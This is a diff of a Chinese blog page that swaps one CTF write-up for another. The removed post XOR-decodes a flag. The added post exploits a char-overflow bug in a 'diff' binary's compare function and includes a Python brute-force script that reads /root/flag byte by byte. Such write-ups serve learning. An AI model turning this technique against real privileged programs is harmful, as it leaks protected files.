@@ -22,31 +22,25 @@
     var CONFIG = {"hostname":"4chan123.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;12-rOdMS1Lyz0Fc-tGxu5hQ 提取码：ex3u 0X01 使用EP查看文件是否有无加壳  没有加壳，直接拖到64位IDA上面 0x02 查看sub_10030函数  点击进去看看  发现是个死循环函数，重复跳转自身  0x02 使用IDA32位打开文件  Shift+F12查看直观函数    F5反编译，发现已经反编译，就无需">
+  <meta name="description" content="0x01 用EP打开，查看加壳没  没有加壳  0x02 用IDA32位打开，F5反编译  漏洞的地方只可能是  compare  0x03 分析代码 1234567891011121314151617int compare()&amp;#123;  char v0; &#x2F;&#x2F; al@2  unsigned int i; &#x2F;&#x2F; [sp+0h] [bp-8h]@1  int v3; &#x2F;&#x2F; [sp+4h] [bp">
 <meta property="og:type" content="article">
-<meta property="og:title" content="BJDCTF8086">
-<meta property="og:url" content="https://4chan123.github.io/2021/04/19/BJDCTF8086/index.html">
+<meta property="og:title" content="BJDCTFdiff2">
+<meta property="og:url" content="https://4chan123.github.io/2021/04/20/BJDCTFdiff2/index.html">
 <meta property="og:site_name" content="4chan">
-<meta property="og:description" content="链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;12-rOdMS1Lyz0Fc-tGxu5hQ 提取码：ex3u 0X01 使用EP查看文件是否有无加壳  没有加壳，直接拖到64位IDA上面 0x02 查看sub_10030函数  点击进去看看  发现是个死循环函数，重复跳转自身  0x02 使用IDA32位打开文件  Shift+F12查看直观函数    F5反编译，发现已经反编译，就无需">
+<meta property="og:description" content="0x01 用EP打开，查看加壳没  没有加壳  0x02 用IDA32位打开，F5反编译  漏洞的地方只可能是  compare  0x03 分析代码 1234567891011121314151617int compare()&amp;#123;  char v0; &#x2F;&#x2F; al@2  unsigned int i; &#x2F;&#x2F; [sp+0h] [bp-8h]@1  int v3; &#x2F;&#x2F; [sp+4h] [bp">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://4chan123.github.io/2021/04/19/BJDCTF8086/0.png">
-<meta property="og:image" content="https://4chan123.github.io/2021/04/19/BJDCTF8086/1.png">
-<meta property="og:image" content="https://4chan123.github.io/2021/04/19/BJDCTF8086/2.png">
-<meta property="og:image" content="https://4chan123.github.io/2021/04/19/BJDCTF8086/3.png">
-<meta property="og:image" content="https://4chan123.github.io/2021/04/19/BJDCTF8086/4.png">
-<meta property="og:image" content="https://4chan123.github.io/2021/04/19/BJDCTF8086/5.png">
-<meta property="og:image" content="https://4chan123.github.io/2021/04/19/BJDCTF8086/6.png">
-<meta property="og:image" content="https://4chan123.github.io/2021/04/19/BJDCTF8086/7.png">
-<meta property="og:image" content="https://4chan123.github.io/2021/04/19/BJDCTF8086/8.png">
-<meta property="article:published_time" content="2021-04-19T10:31:15.000Z">
-<meta property="article:modified_time" content="2021-04-19T11:57:18.421Z">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/20/BJDCTFdiff2/0.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/20/BJDCTFdiff2/3.png">
+<meta property="article:published_time" content="2021-04-20T10:16:29.000Z">
+<meta property="article:modified_time" content="2021-04-21T02:25:13.524Z">
 <meta property="article:author" content="4Chan">
 <meta property="article:tag" content="CTF">
-<meta property="article:tag" content="python构造重复多次异或脚本">
+<meta property="article:tag" content="溢出漏洞">
+<meta property="article:tag" content="python构建针对溢出漏洞的脚本">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://4chan123.github.io/2021/04/19/BJDCTF8086/0.png">
+<meta name="twitter:image" content="https://4chan123.github.io/2021/04/20/BJDCTFdiff2/0.png">
 
-<link rel="canonical" href="https://4chan123.github.io/2021/04/19/BJDCTF8086/">
+<link rel="canonical" href="https://4chan123.github.io/2021/04/20/BJDCTFdiff2/">
 
 
 <script id="page-configurations">
@@ -59,7 +53,7 @@
   };
 </script>
 
-  <title>BJDCTF8086 | 4chan</title>
+  <title>BJDCTFdiff2 | 4chan</title>
   
 
 
@@ -219,7 +213,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://4chan123.github.io/2021/04/19/BJDCTF8086/">
+    <link itemprop="mainEntityOfPage" href="https://4chan123.github.io/2021/04/20/BJDCTFdiff2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -232,7 +226,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          BJDCTF8086
+          BJDCTFdiff2
         </h1>
 
         <div class="post-meta">
@@ -241,10 +235,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-04-19 18:31:15 / 修改时间：19:57:18" itemprop="dateCreated datePublished" datetime="2021-04-19T18:31:15+08:00">2021-04-19</time>
+              <time title="创建时间：2021-04-20 18:16:29" itemprop="dateCreated datePublished" datetime="2021-04-20T18:16:29+08:00">2021-04-20</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-21 10:25:13" itemprop="dateModified" datetime="2021-04-21T10:25:13+08:00">2021-04-21</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -271,8 +271,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2021/04/19/BJDCTF8086/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/04/19/BJDCTF8086/" itemprop="commentCount"></span>
+    <a title="valine" href="/2021/04/20/BJDCTFdiff2/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/04/20/BJDCTFdiff2/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -287,42 +287,21 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/12-rOdMS1Lyz0Fc-tGxu5hQ">https://pan.baidu.com/s/12-rOdMS1Lyz0Fc-tGxu5hQ</a><br>
-提取码：ex3u</p>
-<h2 id="0X01-使用EP查看文件是否有无加壳"><strong>0X01 使用EP查看文件是否有无加壳</strong></h2>
-<p><img src="/2021/04/19/BJDCTF8086/0.png" alt="0"></p>
-<p>没有加壳，直接拖到64位IDA上面</p>
-<h2 id="0x02-查看sub-10030函数"><strong>0x02 查看sub_10030函数</strong></h2>
-<p><img src="/2021/04/19/BJDCTF8086/1.png" alt="1"></p>
-<p>点击进去看看</p>
-<p><img src="/2021/04/19/BJDCTF8086/2.png" alt="2"></p>
-<p>发现是个死循环函数，重复跳转自身</p>
+        <h2 id="0x01-用EP打开，查看加壳没"><strong>0x01 用EP打开，查看加壳没</strong></h2>
+<p><img src="/2021/04/20/BJDCTFdiff2/0.png" alt="0"></p>
+<p>没有加壳</p>
 <hr>
-<p><strong>0x02 使用IDA32位打开文件</strong></p>
-<ul>
-<li>Shift+F12查看直观函数</li>
-</ul>
-<p><img src="/2021/04/19/BJDCTF8086/3.png" alt="3"></p>
-<ul>
-<li>F5反编译，发现已经反编译，就无需反编译</li>
-</ul>
-<p><img src="/2021/04/19/BJDCTF8086/4.png" alt="4"></p>
-<ul>
-<li>分析头函数数据</li>
-</ul>
-<p><img src="/2021/04/19/BJDCTF8086/5.png" alt="5"></p>
-<ul>
-<li>分析sub_10030函数，重复跳转自身的死循环，节选后，按住 <strong><code>C</code></strong> 键开始强制汇编（ <strong><code>Force</code></strong> ）</li>
-</ul>
-<p><img src="/2021/04/19/BJDCTF8086/6.png" alt="6"></p>
+<h2 id="0x02-用IDA32位打开，F5反编译"><strong>0x02 用IDA32位打开，F5反编译</strong></h2>
+<p><img src="/2021/04/20/BJDCTFdiff2/3.png" alt="3"></p>
+<p>漏洞的地方只可能是  <strong><code>compare</code></strong></p>
 <hr>
-<h2 id="0x03-开始分析强制汇编的内容"><strong>0x03 开始分析强制汇编的内容</strong></h2>
-<p><img src="/2021/04/19/BJDCTF8086/7.png" alt="7"></p>
-<hr>
-<h2 id="0x04-开始构建脚本与0X1F做异或"><strong>0x04 开始构建脚本与0X1F做异或</strong></h2>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;]U[du~|t@&#123;z@wj.&#125;.~q@gjz&#123;z@wzqW~/b&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)^<span class="number">0x1F</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/19/BJDCTF8086/8.png" alt="8"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;jack_de_hu1b1an_xuede_henHa0&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-分析代码">0x03 分析代码</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// al@2</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+0h] [bp-8h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+4h] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; buf2[i] + buf1[i] &amp;&amp; i &lt; <span class="number">0x400</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = buf1[i];</span><br><span class="line">    <span class="keyword">if</span> ( v0 != buf2[i] )</span><br><span class="line">      <span class="keyword">return</span> v3 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v0 == <span class="number">10</span> )</span><br><span class="line">      ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>char型变量占1个字节，相当于unsigned byte，表示范围是0x0-0xff，两个char相加的范围就是0x0 - 0x1fe ，由于char型只能存储1个字节的数据，两个char相加产生的进位就会被忽略。<strong><code>char + char = 溢出</code></strong>  举个栗子，0x7d+0x83=0x100-&gt;0x0。</p>
+<p>所以如果buf2[i]+buf1[i]=0x100就会 <strong>终止</strong> for循环</p>
+<p>每次返回一个进行爆破即可</p>
+<h2 id="0x04-构造python脚本"><strong>0x04 构造python脚本</strong></h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> *</span><br><span class="line">fix = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">		payload = fix+<span class="built_in">chr</span>(i)</span><br><span class="line">		<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/ktql&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">			f.write(payload)</span><br><span class="line">		p = Popen([<span class="string">&#x27;/root/diff&#x27;</span>,<span class="string">&#x27;/tmp/ktql&#x27;</span>,<span class="string">&#x27;/root/flag&#x27;</span>],stdout=PIPE)</span><br><span class="line">		res = p.stdout.read()</span><br><span class="line">		<span class="keyword">if</span> res != <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">			fix+=<span class="built_in">chr</span>(<span class="number">0x100</span>-i)</span><br><span class="line">			<span class="built_in">print</span>(fix)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
     </div>
 
@@ -352,7 +331,8 @@
       <footer class="post-footer">
           <div class="post-tags">
               <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
-              <a href="/tags/python%E6%9E%84%E9%80%A0%E9%87%8D%E5%A4%8D%E5%A4%9A%E6%AC%A1%E5%BC%82%E6%88%96%E8%84%9A%E6%9C%AC/" rel="tag"><i class="fa fa-tag"></i> python构造重复多次异或脚本</a>
+              <a href="/tags/%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/" rel="tag"><i class="fa fa-tag"></i> 溢出漏洞</a>
+              <a href="/tags/python%E6%9E%84%E5%BB%BA%E9%92%88%E5%AF%B9%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%84%9A%E6%9C%AC/" rel="tag"><i class="fa fa-tag"></i> python构建针对溢出漏洞的脚本</a>
           </div>
 
         
@@ -361,12 +341,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/04/19/test/" rel="prev" title="test">
-      <i class="fa fa-chevron-left"></i> test
+    <a href="/2021/04/19/python%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9/" rel="prev" title="从零开始学习python第三天">
+      <i class="fa fa-chevron-left"></i> 从零开始学习python第三天
     </a></div>
       <div class="post-nav-item">
-    <a href="/2021/04/19/python%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9/" rel="next" title="从零开始学习python第三天">
-      从零开始学习python第三天 <i class="fa fa-chevron-right"></i>
+    <a href="/2021/04/20/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python%E7%AC%AC%E5%9B%9B%E5%A4%A9/" rel="next" title="从零开始学python第四天">
+      从零开始学python第四天 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -427,7 +407,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0X01-%E4%BD%BF%E7%94%A8EP%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E6%97%A0%E5%8A%A0%E5%A3%B3"><span class="nav-number">1.</span> <span class="nav-text">0X01 使用EP查看文件是否有无加壳</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%9F%A5%E7%9C%8Bsub-10030%E5%87%BD%E6%95%B0"><span class="nav-number">2.</span> <span class="nav-text">0x02 查看sub_10030函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90%E5%BC%BA%E5%88%B6%E6%B1%87%E7%BC%96%E7%9A%84%E5%86%85%E5%AE%B9"><span class="nav-number">3.</span> <span class="nav-text">0x03 开始分析强制汇编的内容</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%BC%80%E5%A7%8B%E6%9E%84%E5%BB%BA%E8%84%9A%E6%9C%AC%E4%B8%8E0X1F%E5%81%9A%E5%BC%82%E6%88%96"><span class="nav-number">4.</span> <span class="nav-text">0x04 开始构建脚本与0X1F做异或</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E7%94%A8EP%E6%89%93%E5%BC%80%EF%BC%8C%E6%9F%A5%E7%9C%8B%E5%8A%A0%E5%A3%B3%E6%B2%A1"><span class="nav-number">1.</span> <span class="nav-text">0x01 用EP打开，查看加壳没</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%94%A8IDA32%E4%BD%8D%E6%89%93%E5%BC%80%EF%BC%8CF5%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="nav-number">2.</span> <span class="nav-text">0x02 用IDA32位打开，F5反编译</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81"><span class="nav-number">3.</span> <span class="nav-text">0x03 分析代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%9E%84%E9%80%A0python%E8%84%9A%E6%9C%AC"><span class="nav-number">4.</span> <span class="nav-text">0x04 构造python脚本</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
